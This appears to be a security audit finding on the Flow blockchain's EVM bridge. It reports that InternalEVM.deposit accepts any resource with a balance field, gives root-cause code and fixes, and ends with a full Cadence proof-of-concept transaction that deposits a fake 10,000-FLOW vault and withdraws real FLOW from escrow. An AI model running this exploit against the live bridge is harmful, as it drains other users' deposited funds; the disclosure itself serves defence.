### Title
`InternalEVM.deposit` Accepts `AnyResource` Instead of `@FlowToken.Vault`, Enabling Fake-Vault Deposits to Drain EVM Bridge Escrow — (`File: fvm/evm/stdlib/contract.go`, `fvm/evm/impl/impl.go`)

---

### Summary

The `InternalEVM.deposit` host function, which is the low-level entry point for crediting EVM accounts with FLOW tokens, declares its `from` parameter as `sema.AnyResourceType` rather than the concrete `@FlowToken.Vault` type. The Go implementation that backs this function reads only the `balance` field of whatever resource is passed, without verifying the resource's actual type. Because `InternalEVM` is a virtual contract with public members accessible from Cadence, any unprivileged transaction sender can call `InternalEVM.deposit` directly with a crafted fake resource, bypassing the `@FlowToken.Vault` type guard that exists only in the higher-level `EVM.EVMAddress.deposit` wrapper. This mints unbacked EVM FLOW balances, which can then be withdrawn as real `@FlowToken.Vault` tokens, draining the EVM bridge escrow of FLOW deposited by legitimate users.

---

### Finding Description

**Root cause — type declaration (`fvm/evm/stdlib/contract.go`, lines 424–436):**

```go
var InternalEVMTypeDepositFunctionType = &sema.FunctionType{
    Parameters: []sema.Parameter{
        {
            Label:          "from",
            TypeAnnotation: sema.NewTypeAnnotation(sema.AnyResourceType), // ← accepts ANY resource
        },
        ...
    },
}
```

The parameter is `sema.AnyResourceType`, not `@FlowToken.Vault`.

**Root cause — Go implementation (`fvm/evm/impl/impl.go`, lines 631–684):**

```go
fromValue, ok := invocation.Arguments[0].(*interpreter.CompositeValue)
// no type identity check here

amountValue, ok := fromValue.GetField(context, "balance").(interpreter.UFix64Value)
// reads "balance" field from whatever resource was passed

account.Deposit(types.NewFlowTokenVault(amount)) // credits EVM account with that amount
```

The implementation casts to `*interpreter.CompositeValue` (any composite resource), reads the `balance` field, and immediately credits the EVM account. There is no check that the resource is `A.<flowTokenAddress>.FlowToken.Vault`.

**The safe wrapper that is bypassable (`fvm/evm/stdlib/contract.cdc`, line 202):**

```cadence
fun deposit(from: @FlowToken.Vault) {   // ← concrete type enforced here only
    ...
    InternalEVM.deposit(from: <-from, to: self.bytes)
}
```

The `@FlowToken.Vault` constraint exists only in the `EVM.EVMAddress.deposit` Cadence wrapper. `InternalEVM` itself is a virtual contract with all members declared as `sema.NewUnmeteredPublicFunctionMember`, making them publicly accessible. A transaction can import `InternalEVM` directly and call `deposit` with any resource that has a `balance: UFix64` field.

---

### Impact Explanation

An attacker who calls `InternalEVM.deposit` directly with a fake resource (any resource with a `balance` field set to an arbitrarily large `UFix64` value) causes the EVM state to record a large FLOW balance for an attacker-controlled EVM address. No real `@FlowToken.Vault` tokens are transferred to the EVM contract's escrow. The attacker then calls `EVM.CadenceOwnedAccount.withdraw()`, which debits the EVM state and releases a real `@FlowToken.Vault` from the EVM contract's escrow — tokens that were deposited by legitimate users. This is a **cross-VM asset loss / bridge escrow mis-accounting** vulnerability: the EVM state's total balance exceeds the real FLOW held in escrow, and the attacker drains the difference.

---

### Likelihood Explanation

The attack requires only a standard unprivileged Cadence transaction. No special keys, staked nodes, or admin access are needed. The attacker must:
1. Deploy or reuse any resource type with a `balance: UFix64` field.
2. Submit a transaction that imports `InternalEVM` and calls `deposit` directly.

The EVM bridge is a live, high-value target. The attack is straightforward to construct and requires no brute force or front-running.

---

### Recommendation

1. **Tighten the type annotation** in `InternalEVMTypeDepositFunctionType` from `sema.AnyResourceType` to the concrete `FlowToken.Vault` sema type, so the Cadence type checker rejects any non-`FlowToken.Vault` resource at compile time.
2. **Add a runtime type identity check** in the Go implementation (`newInternalEVMTypeDepositFunction`) that asserts `fromValue.QualifiedIdentifier()` matches `FlowToken.Vault` before reading the `balance` field, analogous to a factory-registry check.
3. **Restrict `InternalEVM` access** so it is only callable from within the `EVM` contract (e.g., via a `contract`-level entitlement), preventing direct invocation from user transactions.

---

### Proof of Concept

```cadence
import InternalEVM from <evmContractAddress>
import EVM from <evmContractAddress>

// Fake resource with a balance field — not a real FlowToken.Vault
access(all) resource FakeVault {
    access(all) var balance: UFix64
    init(amount: UFix64) { self.balance = amount }
}

transaction {
    prepare(attacker: auth(Storage) &Account) {
        // 1. Create a fake vault claiming 10,000 FLOW
        let fake <- create FakeVault(amount: 10000.0)

        // 2. Create a COA to receive the fake deposit
        let coa <- EVM.createCadenceOwnedAccount()
        let evmAddr = coa.address()

        // 3. Call InternalEVM.deposit directly — bypasses @FlowToken.Vault check
        //    InternalEVMTypeDepositFunctionType accepts AnyResource
        InternalEVM.deposit(from: <-fake, to: evmAddr.bytes)

        // 4. Withdraw real FLOW from the bridge escrow
        let bal = EVM.Balance(attoflow: 0)
        bal.setFLOW(flow: 10000.0)
        let realVault <- coa.withdraw(balance: bal)
        // realVault now holds 10,000 real FLOW drained from other users' deposits

        attacker.storage.save(<-realVault, to: /storage/drainedFlow)
        destroy coa
    }
}
```

The call at step 3 succeeds because `InternalEVMTypeDepositFunctionType.Parameters[0].TypeAnnotation` is `sema.AnyResourceType`, and the Go handler at `fvm/evm/impl/impl.go:648–656` reads `balance` from the fake resource without any type identity verification, crediting the EVM account with 10,000 FLOW that was never actually deposited.
